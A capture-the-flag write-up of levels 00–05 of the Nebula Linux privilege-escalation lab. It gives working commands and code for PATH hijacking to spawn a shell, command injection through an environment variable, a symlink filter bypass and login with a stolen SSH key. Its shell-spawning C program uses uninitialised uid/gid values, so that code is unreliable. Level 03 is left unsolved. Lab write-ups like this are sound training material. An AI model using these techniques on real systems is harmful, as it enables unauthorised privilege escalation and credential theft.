# Writeup for Nebula from exploit.education

Nebula from https://exploit.education/nebula/ is a VM and is a great place to get started for people new to Linux exploitation.

I'm running the nebula VM on VirtualBox in a 'Host-only Adapter' mode.

The username and password for each level will be of the form -

username - levelXX
\
password - levelXX

## Level 00

Level00's description :

> This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

Simply use the ```find``` command
``` bash
level00@nebula:~$ find / -perm -4000 -user flag00 2> /dev/null
/bin/.../flag00
/rofs/bin/.../flag00
```

Running the ```/bin/.../flag00```executable escalates us to the flag00 user

``` bash
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ id
uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 01

Level01's description :
> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

``` C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

```/usr/bin/env``` runs a command in a modified environment. To explot this, simply modify the PATH variable to point to a binary named ```echo``` that we made.

Write a C code that executes a shell.

``` C
#include<stdio.h>
#include<unistd.h>

int main() {
	uid_t uid;
	gid_t gid;

	setresgid(gid,gid,gid);
	setresuid(uid,uid,uid);

	system("/bin/bash");
}
```
Compile it and name the executable as ``echo```.
``` bash
level01@nebula:~$ gcc -o echo exploit.c
```

modify the PATH variable
``` bash
export PATH="/home/level01:$PATH"
```
This will make the binary execute our version of ```echo```.

``` bash
level01@nebula:~$ /home/flag01/flag01
flag01@nebula:~$ id
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
flag01@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 02

Level02's description :
>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

``` C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);

  system(buffer);
}

```

Similar to level01. The ```getenv()``` function returns the current environment variable ```USER```. This is copied to the buffer and passed to the ```system()``` function. This is easily exploitable because we can modify the variable. Simply add a ';' followed by whichever command we want to execute as the ```flag02``` user.

``` bash
level02@nebula:/home/flag02$ USER="lol; getflag;"
level02@nebula:/home/flag02$ ./flag02 2> /dev/null
about to call system("/bin/echo lol; getflag; is cool")
lol
You have successfully executed getflag on a target account
```

## Level 03

Level03's description :
> Check the home directory of flag03 and take note of the files there.
>
> There is a crontab that is called every couple of minutes.

The directory ```/home/flag03/``` contains a folder and a script.

``` bash
level03@nebula:/home/flag03$ ls -l
total 1
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh
level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```


The solution I had in mind is not working. Looked up a few walkthroughs. None are working :( . Should figure this out.

## Level 04

Level04's description :
> This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

``` C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

The directory ```/home/flag04/``` contains two files
``` bash
level04@nebula:/home/flag04$ ls -l
total 8
-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
```
The program ```flag04``` outputs the contents of a file, unless the filename has a substring ```"token"``` in it.

Simply make a soft link to the file ```token``` and read from that.

``` bash
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/random
level04@nebula:/home/flag04$ cd /tmp
level04@nebula:/tmp$ ls -l
total 0
lrwxrwxrwx 1 level04 level04 18 2020-01-28 11:06 random -> /home/flag04/token
level04@nebula:/tmp$ /home/flag04/flag04 random
XXXXXXX-XXX-XXXXX-XXX-XXXXXXXX
```

The file ```token``` contains the password to the ```flag04``` account.

``` bash
level04@nebula:/tmp$ su flag04
Password:
sh-4.2$ whoami
flag04
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## Level 05

Level05's description :
> Check the flag05 home directory. You are looking for weak directory permissions.

``` bash
level05@nebula:~$ cd /home/flag05
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
level05@nebula:/home/flag05$ cd .backup
level05@nebula:/home/flag05/.backup$ ls -la
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
```

The ```.backup/``` folder is both world-readable and world-executable.

Copy the archive and extract the files in it.

``` bash
level05@nebula:~$ cp /home/flag05/.backup/backup-19072011.tgz .
level05@nebula:~$ ls
backup-19072011.tgz
level05@nebula:~$ tar xvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ls -la
total 4
drwxr-x--- 1 level05 level05  140 2020-01-28 11:35 .
drwxr-xr-x 1 root    root     160 2012-08-27 07:18 ..
-rw-rw-r-- 1 level05 level05 1826 2020-01-28 11:35 backup-19072011.tgz
drwxr-xr-x 2 level05 level05  100 2011-07-19 02:37 .ssh
level05@nebula:~/.ssh$ ls -l
total 12
-rw-r--r-- 1 level05 level05  394 2011-07-19 02:37 authorized_keys
-rw------- 1 level05 level05 1675 2011-07-19 02:37 id_rsa
-rw-r--r-- 1 level05 level05  394 2011-07-19 02:37 id_rsa.pub
```

The contents of ```id_rsa.pub``` and ```authorized_keys``` are the same. So we should be able to ssh into flag05 user.

``` bash
level05@nebula:~$ ssh -i ~/.ssh/id_rsa flag05@localhost

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 06
